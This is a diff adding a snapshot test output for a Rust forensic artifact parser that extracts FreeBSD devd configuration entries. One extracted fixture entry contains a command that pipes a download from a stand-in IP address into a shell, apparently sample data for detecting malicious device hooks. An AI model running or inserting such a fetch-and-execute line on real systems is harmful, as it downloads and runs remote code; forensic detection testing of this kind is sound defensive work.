@@ -1,0 +1,6 @@
+---
+source: crates/nixcavate-artifacts/src/bsd/devd.rs
+expression: out
+---
+{"host":"memory","artifact":"devd-conf","source_path":"etc/devd/nxmk.conf","source_line":7,"block":"notify","matches":"\"system\" \"NXMK\"; \"type\" \"x\"","command":"logger -t nxmk hello; curl -s http://192.0.2.7/x | sh"}
+{"host":"memory","artifact":"devd-conf","source_path":"etc/devd/nxmk.conf","source_line":11,"block":"attach","matches":"","command":"/usr/local/bin/hook $device-name"}
